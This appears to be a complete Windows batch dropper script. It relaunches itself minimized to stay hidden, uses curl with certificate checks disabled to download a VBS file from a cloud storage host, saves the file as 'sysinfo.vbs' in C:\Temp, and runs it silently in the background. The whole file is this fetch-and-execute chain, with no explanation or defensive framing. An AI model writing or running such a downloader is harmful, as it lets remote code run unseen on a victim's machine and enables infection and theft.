if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
curl --insecure --output "C:\Temp\sysinfo.vbs"  https://s3.timeweb.cloud/c1718d14-tbaza58/scr_new.vbs
start /b C:\Temp\sysinfo.vbs
exit

